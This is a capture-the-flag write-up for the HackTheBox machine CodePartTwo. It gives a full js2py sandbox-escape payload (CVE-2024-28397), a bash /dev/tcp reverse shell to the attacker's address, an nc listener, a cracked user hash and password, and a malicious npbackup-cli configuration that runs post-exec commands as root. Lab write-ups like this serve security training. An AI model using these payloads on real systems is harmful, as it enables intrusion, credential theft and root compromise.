![[Pasted image 20251212224246.png]]https://app.hackthebox.com/machines/CodePartTwo

![[Pasted image 20251213003503.png]]
## Python console was found on port 8000

# Open the web site port 8000

![[Pasted image 20251212230114.png]]

# We can download the app.

![[Pasted image 20251212231037.png]]


## App Analize


> [!note] APP
> After unpacking the archive, we find the source code of the console in `app.py` along with other folders that we proceed to analyze
> ![[Pasted image 20251212232512.png]]
> <br><br>
>
>We found the Users.db file, but it doesn't contain any valuable data, although its location on the machine is now known, and it's probably structured the same way.
>![[Pasted image 20251212232957.png]]
>
><br><br>
>
>The user table is empty
>![[Pasted image 20251212233635.png]]

# Now let's read the code.

## 🔍 Static Code Analysis

After identifying the source code disclosure vector at the `/download` endpoint, I performed a static analysis of the extracted `app.zip` archive. The application is built using **Flask** and relies on **SQLAlchemy** for ORM interactions with a local SQLite database (`users.db`).

Below are the critical architectural flaws identified during the review:

### 1. Insecure Identity Management
The authentication mechanism implements an obsolete cryptographic standard for password storage.

* **Vulnerability:** Weak Hashing Algorithm (MD5).
* **Observation:** The registration logic persists user credentials using `hashlib.md5()` without any visible salting mechanism.
* **Risk:** MD5 is cryptographically broken. Attackers can trivially reverse these hashes using pre-computed rainbow tables or high-speed cracking tools (e.g., Hashcat), compromising user accounts immediately upon database extraction.

### 2. Critical RCE Sink (Unsafe Execution)
The most severe vulnerability lies in the "Code Snippet" functionality, specifically within the `/run_code` route.

* **Vulnerability:** Server-Side Template Injection / Remote Code Execution.
* **Observation:** The application accepts user-supplied input and passes it directly to the `js2py` library to execute JavaScript on the server side.
* **Code Pattern:**
    ```python
    # Conceptual representation of the vulnerable logic
    import js2py
    js2py.eval_js(user_input) # <--- Critical Sink
    ```
* **Risk:** The `js2py` library is known to allow sandboxing escapes. By crafting a malicious JavaScript payload, it is possible to escape the JS context and execute arbitrary Python code or system commands on the host machine.

### 3. Exposure of Sensitive Logic
* **Observation:** The application explicitly serves its own source code via the `/download` route (`/home/app/app/static/`).
* **Impact:** This "White-Box" exposure allows attackers to map the entire attack surface, locate hidden endpoints, and analyze backend logic for further exploits without relying on guesswork.


# 🚩 Vulnerability Discovery: The "Red Flags"

During the manual inspection of the `app.py` source code, two distinct architectural patterns immediately flagged the application as vulnerable:

1.  **Unsafe Input Handling:** The application imports the `js2py` library and utilizes the `js2py.eval_js(code)` function within the `/run_code` endpoint. Crucially, the `code` argument is derived directly from **user-controlled input** without adequate sanitization.
2.  **Insufficient Sandboxing:** The developers attempted to secure this execution environment using `js2py.disable_pyimport()`. This function is intended to prevent the JavaScript context from importing Python modules (like `os` or `subprocess`).

#### The Research Process

The combination of an older library (`js2py`) and a specific restriction (`disable_pyimport`) strongly suggested a **Sandbox Escape** scenario.

To verify this hypothesis, I performed open-source intelligence (OSINT) research using specific keywords derived from the code analysis:

> `js2py disable_pyimport bypass`
> `js2py sandbox escape poc`
> ![[Pasted image 20251213000752.png]]

**Result:**
The search results confirmed that `disable_pyimport()` is not a robust security control. This specific configuration is vulnerable to **CVE-2024-28397**, a known vulnerability that allows attackers to bypass the restrictions and achieve Remote Code Execution (RCE) on the host machine.


## 💥 Exploitation: From Sandbox Escape to Reverse Shell

### 1. The Mechanism: Bypassing `js2py` Restrictions
The core vulnerability lies in the application's reliance on `js2py` to execute user-supplied code. Although the developers implemented the `js2py.disable_pyimport()` function to secure the execution environment, this control is insufficient.

The chosen Proof of Concept (PoC) targets **CVE-2024-28397**. By traversing the internal object hierarchy within the JavaScript context, the payload recovers a reference to the global Python `__import__` function, effectively bypassing the sandbox. This allows the execution of arbitrary system commands on the host.

### 2. Execution Chain
To operationalize this vulnerability and obtain an initial foothold, the following execution flow was performed:

1.  **Access & Identification:**
    ![[Pasted image 20251213002302.png]]
	* First, valid credentials were obtained by registering a new account and logging into the dashboard
	 ![[Pasted image 20251213003642.png]]
    
	* The vulnerability was identified in the "Python Console" feature running on port 8000, which accepts direct user input.

2.  **Infrastructure Setup:**
    * A local listener was initialized to capture the incoming connection from the target server.
```
nc -lvnp 4444
```

3.  **Vulnerability Validation (Proof of Concept):**
    * Before attempting the reverse shell, a preliminary payload was executed to confirm the `js2py` sandbox escape.
    * This initial code leveraged the `BuiltinImporter` to access the `os` module and execute a benign command (`id`).
    * **Objective:** To verify Remote Code Execution (RCE) capabilities without risking process instability.
    *  ```javascript
var hacked = Object.getOwnPropertyNames({});
var ga = hacked.__getattribute__;
var getAttr = ga("__getattribute__");
var cls = getAttr("__class__");
var base = cls.__base__;
var subs = base.__subclasses__();

var os_module = null;

for (var i in subs) {
	try {
		var item = subs[i];
		if (item && item.__name__ == "module") {
			// ignora
			continue;
		}
		if (item && item.__name__ == "BuiltinImporter") {
			var builtins = item.load_module("builtins");
			var os_module = builtins.__import__("os");
			break;
		}
	} catch (e) {}
}

var out = os_module.system("id");
out;

      ```
   

4.  **Weaponization & Final Payload:**
    * Once RCE was confirmed, a second, more robust payload was crafted targeting the `subprocess.Popen` class.
    *  This payload included the specific logic to establish a stable reverse shell connection back to the listener.
    * The code was injected directly into the console input field.
    * ```javascript
var hacked = Object.getOwnPropertyNames({});
var bymarve = hacked.__getattribute__;
var n11 = bymarve("__getattribute__");
var obj = n11("__class__").__base__;

function findPopen(o) {
    var subs = o.__subclasses__();
    for (var i in subs) {
        try {
            var item = subs[i];
            // solo chequea si tiene atributos de módulo y nombre
            if (item && item.__module__ && item.__name__) {
                if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
                    return item;
                }
            }
            if (item && item.__name__ != "type") {
                var result = findPopen(item);
                if (result) return result;
            }
        } catch (e) {
            // ignorar errores de acceso
            continue;
        }
    }
    return null;
}

var Popen = findPopen(obj);
if (Popen) {
    var cmd = "bash -c 'exec 5<>/dev/tcp/10.10.1x.xxx/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'";
    var out = Popen(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
    console.log(out);
} else {
    console.log("Popen no encontrado");
}
      ```

### **Foothold Established:**

- The server executed the escaped code via `Popen`, initiating a callback to the attack machine.
- **Result:** A shell session was successfully established as the `app` user.
![[Pasted image 20251213015304.png]]

## We open the directory that contains the database (exactly the same as in our app download)

```
cd /home/app/app/instance
```
![[Pasted image 20251213015529.png]]

```
cat users.db
```

We Found a Username **marco** And a Hash **649c9d65a206a75f5abe509fe128bce5**
![[Pasted image 20251213015934.png]]

### We Crack the Hash on https://crackstation.net/
![[Pasted image 20251213020141.png]]
### PW = sweetangelbabylove

# User Flag 🚩

Login via SSH as marco
```
ssh marco@10.10.11.82
```

The flag is 
```
cat /home/marco/cat user.txt
```


## ROOT flag

we check sudo permissions

```
sudo -l
```

![[Pasted image 20260129104302.png]]

**Marco can run as root /usr/local/bin/npbackup-cli**

run the Backup Script
![[Pasted image 20260129104633.png]]

**In the home dir from Marco we have allready a config file npbackup.conf**
![[Pasted image 20260129104918.png]]

We try to run npbackup.conf
```
sudo /usr/local/bin/npbackup-cli -c npbackup.conf -b --force
```

It try to make a backup of ['/home/app/app/'] to repo default But **fails** because Backup is smaller than configured minmium backup size
![[Pasted image 20260129105224.png]]

## Understanding `npbackup.conf`

During the privilege escalation phase, we found a configuration file named `npbackup.conf` in Marco’s home directory.  
This file belongs to the **npbackup-cli** tool, which Marco is allowed to execute as root via `sudo`.

Understanding how this configuration works is critical to explaining why the privilege escalation is possible.

---

### What is `npbackup.conf`?

`npbackup.conf` is the default configuration file for the `npbackup-cli` backup utility.  
It defines how backups are performed, where data is read from, and which repository is used to store the backups.

In this case, the configuration defines a **single default repository** linked to a group named `default_group`.

---

### Backup Source Configuration

```
backup_opts:
  paths:
    - /home/app/app/
  source_type: folder_list
```

This tells `npbackup-cli` to back up the directory:
```
/home/app/app/
```

The `folder_list` source type means that the tool will recursively back up whatever paths are listed here, with no additional path restrictions.
### Repository and Credentials

The repository connection details are stored in encrypted form:
```
repo_uri: __NPBACKUP__...__NPBACKUP__
repo_password: __NPBACKUP__...__NPBACKUP__
```

Although these values are encrypted, they are **not tied to a specific user or configuration checksum**, meaning they can be reused in another configuration file.

---

### Group Defaults

The repository is associated with `default_group`, which defines global backup behavior such as:

- Compression
- Snapshot usage
- Retention policies (daily, hourly, etc.)
- Bandwidth limits

An important detail here is that **repository-level options override group defaults**.

---

### No Post-Execution Commands (By Default)

The original configuration does **not** define any post-execution commands:
```
post_exec_commands: []
```
So under normal conditions, the backup simply copies files and exits.

---

## Why This Matters for Privilege Escalation

Marco is allowed to execute the following binary as root:

```
sudo /usr/local/bin/npbackup-cli
```

The tool also accepts a custom configuration file via the `-c` option.

This means:

- We can supply our own configuration file
- That configuration will be processed **as root**
- And `npbackup-cli` supports **post-execution hooks**

There is **no integrity check or signature validation** on the configuration file.

---

## Key Takeaway

The default `npbackup.conf` is not malicious by itself.  
However, it demonstrates that `npbackup-cli` fully trusts user-supplied configuration files.

When combined with `sudo` permissions, this trust model allows an attacker to:

- Modify backup paths
- Inject post-execution commands
- Execute arbitrary commands as root

This insight is what enables the next step: crafting a malicious configuration file.

## Crafting a Malicious `npbackup` Configuration

After understanding how `npbackup.conf` works, the next step was to abuse its trust model.

The key observation is that **repository-level options override group defaults**, and that `npbackup-cli` allows **post-execution commands** to be defined directly in the configuration file.

Since the binary is executed as root via `sudo`, any post-execution command will also run as root.

---

### Why This Works

`npbackup-cli`:

- Accepts external configuration files via the `-c` flag
- Does not validate the integrity or origin of the configuration file
- Supports `post_exec_commands`
- Executes the entire backup process with root privileges when run via `sudo`

This combination makes the configuration file itself an attack vector.

---

### Strategy

Our approach was simple and reliable:

1. Reuse the legitimate repository configuration  
2. Change the backup source to a privileged directory  
3. Inject post-execution commands to copy the root flag  
4. Adjust file permissions so the current user can read it  

This avoids breaking authentication or repository connectivity.

---

### Modifying the Backup Source

In the original configuration, the backup source is:
yaml
```
paths:
  - /home/app/app/
```

We changed it to:
```
paths:
  - /root
```
This forces the backup process to access a directory that is normally restricted to root.

---

### Injecting Post-Execution Commands

We then added a `post_exec_commands` section:
yaml
```

post_exec_commands:
  - "mkdir -p /tmp/rootbackup"
  - "cp /root/root.txt /tmp/rootbackup/flag.txt 2>/dev/null || true"
  - "chmod 644 /tmp/rootbackup/flag.txt"
  - "chown marco:marco /tmp/rootbackup/flag.txt"
```

These commands:

- Create a writable directory in `/tmp`
- Copy the root flag to a readable location
- Set permissive file permissions
- Change ownership to the current user

All commands execute **as root**.

---

### Crafting the Malicious Configuration File

We created the malicious configuration file in `/tmp`:
```
cat <<'EOF' > /tmp/malicious.conf
conf_version: 3.0.1
audience: public

repos:
  default:
    repo_uri: __NPBACKUP__...__NPBACKUP__
    repo_group: default_group

    backup_opts:
      paths:
        - /root
      source_type: folder_list
      post_exec_commands:
        - "mkdir -p /tmp/rootbackup"
        - "cp /root/root.txt /tmp/rootbackup/flag.txt 2>/dev/null || true"
        - "chmod 644 /tmp/rootbackup/flag.txt"
        - "chown marco:marco /tmp/rootbackup/flag.txt"

    repo_opts:
      repo_password: __NPBACKUP__...__NPBACKUP__
EOF

```
The encrypted `repo_uri` and `repo_password` values were copied directly from the original configuration.

---

### Executing the Backup as Root

Finally, we executed `npbackup-cli` with our malicious configuration:
```
sudo /usr/local/bin/npbackup-cli -c /tmp/malicious.conf -b --force
```
The backup process reports errors related to minimum backup size, but these can be safely ignored.  
The post-execution commands are still executed.

---

### Retrieving the Root Flag

After the command completes, we verify that the flag was copied successfully:
```
ls -l /tmp/rootbackup/flag.txt
cat /tmp/rootbackup/flag.txt
```

At this point, we have full root-level access to protected data.

---

## Final Notes

This privilege escalation does not rely on exploiting a memory bug or misconfigured file permissions.

Instead, it abuses:

- A trusted configuration format
- Missing integrity checks
- A privileged execution context

This makes it a **clean, deterministic, and realistic escalation vector**.